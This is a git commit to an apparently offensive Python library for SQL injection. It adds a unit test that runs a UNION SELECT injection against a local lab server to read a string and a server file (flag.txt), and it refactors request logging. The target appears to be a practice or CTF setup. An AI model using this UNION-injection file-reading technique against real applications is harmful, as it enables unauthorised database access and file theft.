a8a9306cf56b9a83f7f1c694747e8664f5ee54fa
neuronaddict <dev@lacourarie.org>
2019-01-20 02:36:03 +0100

    Use global logger + test.

---
+++ pysqli/test_unionStringFinder.py
@@ -0,0 +1,23 @@
+from unittest import TestCase
+
+import requests
+
+from pysqli import UnionStringFinder, StarExtract, SqliEncoder
+
+
+class TestUnionStringFinder(TestCase):
+
+    def setUp(self):
+        self.union_string_finder = UnionStringFinder('AND 1=0 UNION ALL SELECT 1,2,{}',
+                                                     lambda payload: requests.get('http://127.0.0.1:8181/comment.php',
+                                                                                  params={'id': '1 {}'.format(payload),
+                                                                                          'log': '1'}),
+                                                     StarExtract('<h2>2</h2><p>*</p>'))
+
+    def test_read_string(self):
+        self.assertEqual(self.union_string_finder.read_string('(SELECT {})'.format(SqliEncoder.str_to_hexa('coucou'))),
+                         'coucou')
+
+    def test_read_file(self):
+        self.assertEqual(self.union_string_finder.read_file('/var/www/html/flag.txt'),
+                         'dee8cha8moh9ahyeM4atheemi\n')
--- pysqli/union_string_finder.py
+++ pysqli/union_string_finder.py
@@ -1,7 +1,5 @@
 from pysqli import SqliEncoder
-from pysqli.payloads import MysqlPayloads
 from pysqli.string_finder import StringFinder
-from termcolor import colored
 
 
 class UnionStringFinder(StringFinder):
@@ -9,7 +7,7 @@ class UnionStringFinder(StringFinder):
     This class can get a string with the union technique
     """
 
-    def __init__(self, union_payload, request_builder, response_extractor, log=False, payloads=MysqlPayloads()):
+    def __init__(self, union_payload, request_builder, response_extractor, logger=None):
         """
         Create a new UnionStringFinder. To do this, we need :
         - a union payload, ie 'UNION ALL SELECT 1,2,{}'
@@ -19,23 +17,17 @@ class UnionStringFinder(StringFinder):
         :param union_payload union payload, ie 'UNION ALL SELECT 1,2,{}', with '{}' for the string to read
         :param request_builder: callable that take a payload to return a response
         :param response_extractor: callable that take a response and return a string
-        :param log: if True, log all requests / response (very verbose). False by default.
-        :param payloads payload collection
+        :param logger: if not None, use a logger (see loggers.py). For Http use logger=HttpLogger()
         """
         self.union_payload = union_payload
         self.request_builder = request_builder
         self.response_extractor = response_extractor
-        self.log = log
+        self.logger = logger
 
     def read_string(self, sql):
         r = self.request_builder(self.union_payload.format(sql))
-        if self.log:
-            print(colored('[*] (request) {}'.format(r.request.url), 'blue'))
-            print(colored('    (headers) {}'.format(r.request.headers), 'blue'))
-            print(colored('    (body) {}'.format(r.request.body), 'blue'))
-            print('[*] (response) {}'.format(r.status_code))
-            print('    (headers) {}'.format(r.headers))
-            print('    (text body)\n {}'.format(r.text))
+        if self.logger is not None:
+            self.logger(r)
         return self.response_extractor(r)
 
     def read_file(self, filename):
